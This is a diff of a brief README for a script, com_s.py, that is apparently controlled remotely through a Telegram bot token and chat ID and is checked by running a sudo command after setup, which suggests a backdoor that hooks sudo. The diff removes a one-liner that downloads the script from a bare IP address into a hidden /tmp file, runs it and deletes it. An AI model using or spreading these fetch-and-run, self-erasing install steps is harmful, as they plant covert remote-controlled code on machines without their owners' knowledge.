@@ -1,9 +1,8 @@
 Enter your telegram bot token and chat ID in the script for control
 
 Execute and checking the bot:-
-curl -o /tmp/.com_s.py "http://10.170.233.206:3000/download/com_s.py" && chmod +x /tmp/.com_s.py && python3 /tmp/.com_s.py setup && rm /tmp/.com_s.py
-
 chmod +x com_s.py && python3 com_s.py setup
+
 use any 'sudo' command on new terminal:-
 sudo ls
 
